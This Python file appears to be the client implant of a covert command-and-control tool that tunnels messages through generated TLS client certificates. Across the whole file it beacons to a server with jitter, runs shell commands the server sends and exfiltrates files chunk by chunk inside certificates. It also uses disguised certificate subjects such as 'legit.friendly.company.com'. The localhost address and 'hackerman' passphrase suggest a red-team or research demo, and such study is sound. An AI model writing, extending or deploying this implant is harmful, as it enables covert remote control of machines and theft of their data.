import subprocess
import asyncio
from os import path
import socket
import ssl
import random
from cryptography import x509
from cert_gen import gen_msg_cert, get_cert_msg, init_cert_gen, Colors


def run_bash_cmd(cmd):
    """ Run the cmd sent by the server and return the output """
    process = subprocess.run(
        cmd,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        check=True, text=True)
    data = process.stdout.strip()
    return data


def chunk_file(exfil_file, max_block_size, jitter):
    """
    Chunk the file during data exfiltration

    transfer_state
        - 1=first blob
        - 2=not first, not last
        - 3=last blob
    """
    position = 0
    transfer_state = 1
    with open(exfil_file, "rb") as handle:
        while True:
            rnd_jitter = random.randrange(0, jitter) / 100
            size = int(max_block_size - (max_block_size * rnd_jitter))
            image_data = handle.read(size)
            if not image_data:
                break
            print(f"{Colors.LIGHT_CYAN}Reading {len(image_data)} bytes from file{Colors.ENDC}")
            position += size
            if transfer_state == 2 and len(image_data) != size:
                transfer_state = 3
            yield image_data, transfer_state
            if transfer_state == 1:
                transfer_state = 2


async def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert):
    print(f"{Colors.LIGHT_CYAN}Creating client side socket{Colors.ENDC}")
    msg_cert, msg_key = msg_cert
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setblocking(1)
        sock.settimeout(10)
        try:
            sock.connect((host_addr, host_port))
        except ConnectionRefusedError as ex:
            """ Note: after each msg from the server, the server has to generate a new cert for the next msg, 
            tear down the socket, and spin up a new socket with the new cert. If the client tries to call 
            while the socket is down, just sleep a bit and try again
            """
            print(f"{Colors.RED}Server connection refused - trying again soon{Colors.ENDC}")
            return None
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_verify_locations(cafile=ca_cert_path)
        context.load_cert_chain(certfile=msg_cert, keyfile=msg_key)
        with context.wrap_socket(sock, server_side=False, server_hostname=server_sni_hostname) as secure_sock:
            cert = secure_sock.getpeercert(binary_form=True)
            cert = x509.load_der_x509_certificate(cert)
            # secure_sock.write(b'hello')
            # print(secure_sock.read(1024))
    print(f"{Colors.LIGHT_CYAN}Tearing down client side socket{Colors.ENDC}")
    return cert


async def send_file(host_addr, host_port, cert_root_path, ca_cert_path, ca_cert, ca_key, server_sni_hostname,
              subject, exfil_file, max_block_size, data_jitter):
    """
    msg format: is_first|is_last|len_of_data_chuck|file_name
    change to:
    msg format: transfer_state|len_of_data_chuck|file_name
        transfer_state: 1=is_first, 2=is_middle, 3=is_last
    """
    gen_cert_path = f"{cert_root_path}/client_certs"
    file_name = path.basename(exfil_file)
    # break data file into chunks to send
    for data_chunck, transfer_state in chunk_file(exfil_file, max_block_size, data_jitter):
        # generate the client cert with embedded data
        msg = f"{transfer_state}|{len(data_chunck)}|{file_name}"
        msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data_chunck)
        # send data to server
        await call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert)
    print(f"{Colors.LIGHT_CYAN}File exfill complete{Colors.ENDC}")


def pos_or_neg():
    if random.random() > 0.5:
        return 1
    return -1


async def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject,
                 server_sni_hostname, beacon_interval, beacon_jitter, max_block_size, data_jitter):
    gen_cert_path = f"{cert_root_path}/client_certs"
    ca_key, ca_cert = await init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)

    # pre-create the request command
    request_msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="beacon")
    next_msg_cert = request_msg_cert
    while True:
        # calc beacon delay
        beacon_delay = int(beacon_interval + (pos_or_neg() * (beacon_interval * (random.randrange(0, beacon_jitter) / 100))))
        print(f"{Colors.LIGHT_CYAN}Sleeping for {beacon_delay} seconds{Colors.ENDC}")
        await asyncio.sleep(beacon_delay)
        # call server for cmd
        cert = await call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, next_msg_cert)
        if cert:
            srv_msg, srv_data = await get_cert_msg(cert)
            if srv_msg == "bash":
                command = srv_data.strip()
                print(f"{Colors.LIGHT_CYAN}Executing cmd: {command}{Colors.ENDC}")
                data = run_bash_cmd(command.split(" "))
                next_msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response", data=data)
            elif srv_msg == "noop":
                # nothing to do
                print("noop")
                next_msg_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response")
            elif srv_msg == "wait":
                # update beacon interval
                beacon_interval, beacon_jitter = srv_data.strip().split(",")
                beacon_interval = int(beacon_interval)
                beacon_jitter = int(beacon_jitter)
                print(f"{Colors.LIGHT_CYAN}Updating beacon interval to {beacon_interval} with jitter of {beacon_jitter}{Colors.ENDC}")
                next_msg_cert = request_msg_cert
            elif srv_msg == "exfil":
                exfil_file = srv_data.strip()
                await send_file(host_addr, host_port, cert_root_path, ca_cert_path,
                          ca_cert, ca_key, server_sni_hostname,
                          subject, exfil_file, max_block_size, data_jitter)
                # set next msg to request
                next_msg_cert = request_msg_cert
            elif srv_msg == "kill":
                print(f"{Colors.RED}SHUTTING DOWN{Colors.ENDC}")
                return
            else:
                print(f"{Colors.RED}WARN: invalid msg: {srv_msg}{Colors.ENDC}")


def main():
    host_addr = "127.0.0.1"
    host_port = 8089
    # at some point create a channel to pull the ca pem/key from the server at runtime so its not hard coded
    passphrase = b"hackerman"
    cert_root_path = "certs/"
    ca_cert = f"{cert_root_path}/ca_certs/hmCA.pem"
    ca_key = f"{cert_root_path}/ca_certs/hmCA.key"
    server_sni_hostname = "org.gov.hackerman.xyz"
    subject = {
        "C": "US",
        "ST": "Washington",
        "L": "Seattle",
        "O": "Friendly Company LLC",
        "CN": "legit.friendly.company.com",
    }
    beacon_interval = 5
    beacon_jitter = 30
    max_block_size = 50000  # max block size is ~60000
    data_jitter = 30  # jitter from 0 to 100
    asyncio.run(start_client(
        host_addr,
        host_port,
        cert_root_path,
        ca_cert,
        ca_key,
        passphrase,
        subject,
        server_sni_hostname,
        beacon_interval,
        beacon_jitter,
        max_block_size,
        data_jitter))


if __name__ == '__main__':
    main()
